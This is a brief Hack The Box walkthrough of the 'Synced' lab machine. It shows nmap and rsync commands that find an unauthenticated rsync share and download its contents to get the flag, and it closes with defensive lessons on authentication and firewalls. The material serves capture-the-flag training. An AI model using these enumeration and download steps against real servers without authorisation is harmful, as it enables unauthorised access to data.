---
title: "Synced — Hack The Box Walkthrough"
description: "Pwning Synced through an unauthenticated open rsync share."
date: 2026-09-01
category: offensive
readTime: "3 min read"
mitre:
  - "T1190"
tags:
  - "Hack The Box"
  - "rsync"
  - "Open Share"
  - "Linux"
  - "CTF"
summary: "Pwning Synced through an unauthenticated open rsync share."
---

**Machine:** Synced
**Difficulty:** Very Easy
**Key Techniques:** Open rsync module, no authentication

---

## Enumeration

### Port Scanning

```bash
nmap -sV -p 873 10.129.228.37
```

| Port | Service | Version |
|------|---------|---------|
| 873 | rsync | protocol version 31 |

The rsync daemon is exposed with a public share requiring no authentication.

---

## Exploitation

### Listing Shares

```bash
rsync --list-only rsync://10.129.228.37/
```

This reveals a share name (e.g. `public`).

### Downloading Contents

```bash
rsync --list-only rsync://10.129.228.37/<share>/

rsync rsync://10.129.228.37/<share>/ ./synced/
```

The synced directory contains the flag file.

```
flag.txt: <flag>
```

---

## Lessons Learned

1. **Anonymous rsync shares are an open door.** The daemon was accessible from anywhere with no auth — anyone could read the entire share.
2. **Restrict rsync with authentication and firewalls.** Bind to loopback or use SSH-based sync instead.
3. **Monitor rsync connections** and audit share permissions regularly.
